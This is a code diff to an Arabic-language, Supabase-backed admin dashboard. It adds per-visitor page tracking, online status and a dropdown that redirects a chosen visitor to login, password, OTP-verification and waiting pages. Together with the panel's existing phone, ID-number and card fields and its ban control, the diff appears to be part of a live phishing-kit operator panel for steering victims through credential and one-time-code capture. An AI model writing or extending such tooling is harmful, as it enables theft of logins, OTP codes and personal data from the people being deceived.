@@ -147,9 +147,18 @@
                     <span class="bg-red-600 text-white text-xs px-3 py-1 rounded cursor-pointer hover:bg-red-700 transition">
                         حظر <i class="fa-solid fa-ban mr-1"></i>
                     </span>
-                    <span class="border border-green-500 text-green-600 text-xs px-3 py-1 rounded cursor-pointer hover:bg-green-50 transition" id="detail-status">
-                        insurance
-                    </span>
+                    <span id="detail-page" class="bg-blue-50 text-blue-700 border border-blue-200 text-xs px-3 py-1 rounded font-bold">—</span>
+                    <select id="page-redirect" onchange="if(this.value){window.open(this.value,'_blank');this.selectedIndex=0;}" class="border border-green-500 text-green-600 text-xs px-2 py-1 rounded bg-white cursor-pointer hover:bg-green-50 transition font-bold">
+                        <option value="">إعادة توجيه إلى صفحة…</option>
+                        <option value="/">الرئيسية</option>
+                        <option value="/customer-details/">بيانات العميل</option>
+                        <option value="/dashboard/">لوحة المستخدم</option>
+                        <option value="/access-username/">صفحة الدخول</option>
+                        <option value="/access-password/">كلمة المرور</option>
+                        <option value="/access-verification/">التحقق (OTP)</option>
+                        <option value="/access-waiting/">صفحة الانتظار</option>
+                        <option value="/becare/">لوحة الإدارة</option>
+                    </select>
                 </div>
             </div>
 
@@ -197,6 +206,7 @@
     </div>
 
     <!-- Supabase data layer: realtime (WS events) + silent 30s polling, no page reload -->
+<!-- Supabase data layer: instant online/offline + live typing + page tracking -->
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.49.4/dist/umd/supabase.min.js"></script>
 <script>
 // ---------------------------------------------------------------------------
@@ -322,8 +332,27 @@ function toDate(value) {
 }
 
 function isOnline(u) {
+    if (u.isOnlineFlag === false) return false;
     const d = toDate(u.lastSeen);
     return !!(d && (Date.now() - d.getTime()) < 90000);
+}
+
+const PAGE_LABELS = [
+    [/customer-details/i, 'بيانات العميل'],
+    [/access-username/i, 'صفحة الدخول'],
+    [/access-password/i, 'كلمة المرور'],
+    [/access-verification/i, 'التحقق (OTP)'],
+    [/access-waiting/i, 'صفحة الانتظار'],
+    [/dashboard/i, 'لوحة المستخدم'],
+    [/becare/i, 'لوحة الإدارة'],
+    [/test/i, 'اختبار']
+];
+function pageLabel(p) {
+    if (!p) return 'الرئيسية';
+    for (const [re, label] of PAGE_LABELS) if (re.test(p)) return label;
+    const clean = p.replace(/\/+$/, '');
+    if (clean === '' || /index\.html$/i.test(clean)) return 'الرئيسية';
+    return clean;
 }
 
 function timeAgo(value) {
@@ -366,6 +395,8 @@ function mapVisitor(row) {
         archived: !!row.archived,
         createdAt: row.created_at,
         lastSeen: row.last_seen,
+        isOnlineFlag: row.is_online !== false,
+        page: row.page || '',
         online: false
     };
 }
@@ -430,6 +461,9 @@ function renderUsersList() {
                     <div class="mt-0.5 text-[11px] text-gray-500 flex items-center gap-2" dir="ltr">
                         <span>${user.phone !== '—' ? user.phone : ''}</span>
                     </div>
+                    <div class="mt-0.5 text-[10px] text-gray-400 flex items-center gap-1">
+                        <i class="fa-solid fa-location-dot"></i> يتواجد في: ${pageLabel(user.page)}
+                    </div>
                     ${isSelected ? `<div class="mt-1 flex items-center gap-2 text-xs text-gray-500">
                         <span><i class="fa-solid fa-mobile-screen"></i> ${user.deviceInfo || ''}</span>
                     </div>` : ''}
@@ -484,7 +518,8 @@ function selectUser(id) {
     document.getElementById('detail-id-short').innerHTML = `${user.shortId || '————'} <i class="fa-regular fa-copy cursor-pointer hover:text-green-600" onclick="window.copyToClipboard('${user.shortId || ''}')"></i>`;
     document.getElementById('detail-phone').innerText = user.phone;
     document.getElementById('detail-id').innerText = user.idNumber;
-    document.getElementById('detail-status').innerText = user.status;
+    const pageEl = document.getElementById('detail-page');
+    if (pageEl) pageEl.innerHTML = '<i class="fa-solid fa-location-dot"></i> يتواجد في: ' + pageLabel(user.page);
 
     document.getElementById('card-name').innerText = user.name;
     document.getElementById('card-id').innerText = user.idNumber;
